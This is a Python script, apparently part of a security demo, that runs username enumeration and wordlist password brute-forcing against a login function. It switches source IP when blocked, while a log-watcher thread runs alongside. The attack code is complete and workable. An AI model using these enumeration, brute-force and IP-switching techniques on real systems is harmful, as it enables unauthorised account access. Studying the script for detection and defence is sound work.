import argparse
import threading
from login import login
from log_watcher import monitor_logs
import os
import sys
from colorama import Fore, Style
import ipaddress

def is_valid_ip(ip_str):
    try:
        ip = ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False

def get_valid_ip(prompt="[*] [ATTACKER] Input your IP-Address: "):
    while True:
        ip = input(prompt)
        if is_valid_ip(ip):
            return ip
        print("[!] Invalid IP address. Please enter a valid host IP (e.g., 192.168.1.42)")

def bruteforce(args):
    if args.Search:
        print(Fore.RED+f"[*] [ATTACKER] Starting user enumeration"+Style.RESET_ALL)
        users = []
        base_path = os.path.dirname(os.path.abspath(__file__))
        filepath = os.path.join(base_path, "Wordlists/names.txt")
        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if "username" not in login(line, "abcdef"):
                    users.append(line)
        print('Found {0} users \n'.format(len(users)))
        for user in users:
            print('[+] {0}'.format(user))
    elif args.User:
        print(Fore.RED+f"[*] [ATTACKER] Starting bruteforce attack on user '{args.User}'"+Style.RESET_ALL)
        if args.Wordlist:
            filepath = args.Wordlist
        else:
            base_path = os.path.dirname(os.path.abspath(__file__))
            filepath = os.path.join(base_path, "Wordlists/10k-most-common.txt")
        try:
            ipAddr = get_valid_ip()
            with open(filepath, "r") as f:
                for line in f:
                    password = line.strip()
                    try:
                        if "successful" in login(args.User,password,ipAddr):
                            print(Fore.GREEN + f"[+] Password found: {args.User}:{password}" + Style.RESET_ALL)
                            return
                    except Exception as e:
                        print(Fore.RED + f"[!] [ATTACKER] {e}" + Style.RESET_ALL)
                        ipAddr = get_valid_ip("[!] [ATTACKER] Enter new IP: ")
        except FileNotFoundError:
            print(Fore.RED + f"[!] [ATTACKER] Wordlist file not found: {filepath}" + Style.RESET_ALL)
            sys.exit(1)
        print(Fore.RED + "[-] [ATTACKER] Password not found in wordlist." + Style.RESET_ALL)


def start_log_watcher(demo):
    monitor_logs(demo)  




def main():
    parser = argparse.ArgumentParser(usage="bruteforce.py -s | -u <user> [-w <wordlist>]",
        description="Either use -s alone to search for usernames, or -u (with optional -w) to bruteforce a user.")
    parser.add_argument("-s", "--Search", action="store_true", help="Search for usernames (cannot be combined with -u or -w)")
    parser.add_argument("--demo", action="store_true", help="Use lower threshold for demo mode")
    group_user = parser.add_argument_group("Bruteforce options")
    group_user.add_argument("-u", "--User", help="Username to bruteforce")
    group_user.add_argument("-w", "--Wordlist", help="Path to wordlist (optional, used with -u)")

    args = parser.parse_args()
    if not args.Search and not args.User:
        parser.error("You must specify either -s or -u")

    if args.Wordlist and not args.User:
        parser.error("-w/--Wordlist requires -u/--User.")

    if args.Search and args.User:
        parser.error("Cannot specify -s AND -u")
    watcher_thread = threading.Thread(target=start_log_watcher,args=([args.demo]), daemon=True)
    watcher_thread.start()

    bruteforce(args)
    

if __name__ == "__main__":
    main()